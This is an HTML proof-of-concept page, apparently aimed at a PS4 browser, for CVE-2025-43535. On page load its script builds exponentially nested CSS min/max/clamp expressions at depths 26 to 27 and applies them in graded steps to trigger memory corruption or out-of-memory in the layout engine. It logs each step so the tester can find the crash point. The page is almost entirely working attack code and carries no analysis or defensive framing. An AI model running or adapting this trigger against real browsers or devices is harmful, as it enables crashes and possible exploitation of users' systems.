<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CVE-2025-43535 PoC — Salto Direto 26</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
  #log { background:#111; border:1px solid #88ff88; padding:12px;
         height:320px; overflow-y:auto; font-size:12px; }
  .ok{color:#00ff88} .fail{color:#ff4444} .info{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>
<h3>CVE-2025-43535 — Memory Corruption (Zona Crítica: 26 ao 27)</h3>
<div id="log"></div>

<script>
"use strict";

const L=(m,c)=>{const d=document.getElementById('log');
  d.innerHTML+=`<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
  d.scrollTop=d.scrollHeight;
};

// Respiro de 150ms: Essencial para o GC limpar o lixo massivo do nível 26 
// antes de tentar os passos intermediários.
const yieldGC = () => new Promise(r => setTimeout(r, 150));

async function variant1_css_calc_deep() {
  L("[V1] Iniciando CSS calc() + math (Salto Direto)...");

  const el = document.createElement('div');
  el.style.cssText = 'position:absolute;top:-9999px';
  document.body.appendChild(el);

  // Função exponencial matemática fiel à PoC original
  function makeMathNested(depth) {
    if (depth <= 0) return '10px';
    const funcs = ['min', 'max', 'clamp'];
    const f = funcs[depth % 3];
    if (f === 'clamp') {
      return `clamp(${makeMathNested(depth-1)}, ${depth*5}px, ${makeMathNested(depth-2 < 0 ? 0 : depth-2)})`;
    }
    return `${f}(${makeMathNested(depth-1)}, ${makeMathNested(depth-1)})`;
  }

  // FASE 1: O Salto Direto
  L("[V1] Dando o salto direto para o nível 26...");
  try {
    // Dá um frame de respiro para a UI atualizar antes de travar a thread
    await new Promise(r => requestAnimationFrame(r));
    
    el.style.width = makeMathNested(26);
    void el.offsetWidth;
    L(`[V1] Nível 26 processado com sucesso!`, "ok");
  } catch(e) {
    L(`[V1] Erro no nível 26: ${e}`, "fail");
  }
  
  // Limpa o estilo gigante para o Garbage Collector agir
  el.style.width = '10px';
  await yieldGC();

  L("[V1] Entrando na zona de precisão milimétrica (26 ao 27)...");

  // FASE 2: Degraus Fracionados 
  // O tamanho vai aumentando gradativamente até chegar no peso exato do 27
  const passosIntermediarios = [
    { nome: "26.1", expr: `min(${makeMathNested(26)}, ${makeMathNested(20)})` }, // ~1.05x o tamanho do 26
    { nome: "26.3", expr: `min(${makeMathNested(26)}, ${makeMathNested(24)})` }, // ~1.25x
    { nome: "26.5", expr: `min(${makeMathNested(26)}, ${makeMathNested(25)})` }, // ~1.50x
    { nome: "26.8", expr: `clamp(${makeMathNested(26)}, 10px, ${makeMathNested(25)})` }, // ~1.75x
    { nome: "27.0", expr: makeMathNested(27) } // 2.0x (O limite final do OOM)
  ];

  for (const passo of passosIntermediarios) {
    try {
      L(`[V1] Testando passo intermediário ${passo.nome}...`);
      await new Promise(r => requestAnimationFrame(r)); 
      
      el.style.width = passo.expr;
      void el.offsetWidth;
      L(`[V1] Passo ${passo.nome} executado limpo!`, "ok");
    } catch(e) {
      L(`[V1] Exceção JS no passo ${passo.nome}.`, "fail");
    }
    
    // Limpeza forçada após cada aberração fracionada
    el.style.width = '10px';
    await yieldGC(); 
  }

  document.body.removeChild(el);
  L("[V1] Teste da zona crítica finalizado", "ok");
}

async function main() {
  try {
    await variant1_css_calc_deep();
    L("=== FIM DA EXECUÇÃO ===", "ok");
    L("Se o PS4 crashear, anote exatamente em qual passo intermediário parou!", "info");
  } catch(e) {
    L("EXCEÇÃO FATAL: " + e.toString(), "fail");
  }
}

window.addEventListener('load', () => setTimeout(main, 500));
</script>
</body>
</html>
